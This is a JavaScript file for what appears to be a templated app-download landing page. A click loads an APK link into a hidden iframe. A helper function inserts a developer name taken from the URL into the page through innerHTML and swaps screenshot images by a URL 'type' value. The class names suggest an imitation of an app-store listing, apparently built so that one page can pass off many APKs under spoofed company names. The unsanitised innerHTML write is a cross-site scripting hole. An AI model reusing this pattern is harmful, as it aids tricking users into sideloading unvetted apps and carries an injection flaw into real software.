function handleButtonClick() {
  if (oneLink) {
    syncDownload();

    getResultUrl(oneLink).then((url) => {
      if (url) {
        beginDownLoadApk(url);
      } else {
        beginDownLoadApk(downUrl);
      }
    });
  } else {
    beginDownLoadApk(downUrl);
  }
}

function beginDownLoadApk(url, taEvent) {
  taEvent = taEvent != undefined ? taEvent : "downLoad";
  var hiddenIframe = document.getElementById("hiddenIframe");
  if (!hiddenIframe) {
    hiddenIframe = document.createElement("iframe");
    hiddenIframe.style.display = "none";
    hiddenIframe.id = "hiddenIframe";
    document.body.appendChild(hiddenIframe);
  }
  // console.log(url);
  if (hiddenIframe) {
    hiddenIframe.src = url;
  } else {
    window.location.href = url;
  }
}

window.onload = function () {
  // 根据URL路径替换素材的五连图路径
  function reloadPictures() {
    const searchParams = new URLSearchParams(window.location.search);
    const params = {};
    for (const [key, value] of searchParams) {
      params[key] = value;
    }

    if (params["name"] && params["name"].length > 0) {
      var gameNames = document.getElementsByClassName("UOWBSH");
      for (let index = 0; index < gameNames.length; index++) {
        gameNames[index].innerHTML = params["name"] + " Corporation";
      }
    }

    if (params["type"] && params["type"].length > 0) {
      // 修改icon路径
      var iconClass = document.getElementsByClassName("fFmL2e");

      // 遍历元素并修改五连图img的src路径
      for (var i = 0; i < iconClass.length; i++) {
        var dirName = iconClass[i].getAttribute("src").replace("./filesfm", "");
        var finalPath = "./filesfm/" + params["type"] + dirName;
        iconClass[i].setAttribute("src", finalPath);
      }

      // 获取五连图的class dom
      var elements = document.getElementsByClassName("B5GQxf");

      // 遍历元素并修改五连图img的src路径
      for (var i = 0; i < elements.length; i++) {
        var dirName = elements[i].getAttribute("src").replace("./filesfm", "");
        var finalPath = "./filesfm/" + params["type"] + dirName;
        elements[i].setAttribute("src", finalPath);
      }
    }
  }
};
